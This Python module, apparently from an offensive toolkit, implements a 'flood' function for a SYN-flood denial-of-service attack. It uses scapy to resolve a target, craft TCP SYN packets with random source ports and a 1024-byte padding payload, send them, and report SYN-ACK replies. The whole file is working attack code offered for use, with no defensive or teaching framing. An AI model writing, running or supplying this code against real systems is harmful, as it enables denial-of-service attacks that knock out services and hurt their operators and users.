"""This module provides the flood function for a SYN-FLOOD attack."""

import socket
from random import randint

from colorama import Fore as F
from scapy.all import Raw, sr1
from scapy.layers.inet import IP, TCP

from tools.addons.ip_tools import get_target_domain


def flood(target: str) -> None:
    """Send a SYN packet to the target.

    Args:
        - target - The target's address

    Returns:
        None
    """
    domain, port = get_target_domain(target)
    ip_addr = socket.gethostbyname(domain)

    ip_layer = IP(dst=ip_addr)
    tcp_layer = TCP(sport=(sport := randint(1024, 65536)), dport=port, flags="S")
    data = Raw(b"X" * 1024)

    packet = ip_layer / tcp_layer / data

    ans = sr1(packet, verbose=0)

    try:
        if ans[1].flags.flagrepr() == "SA":
            print(f"--> Socket on Port {F.BLUE}{sport:<5}{F.RESET} sent a SYN packet")
    except:
        ...
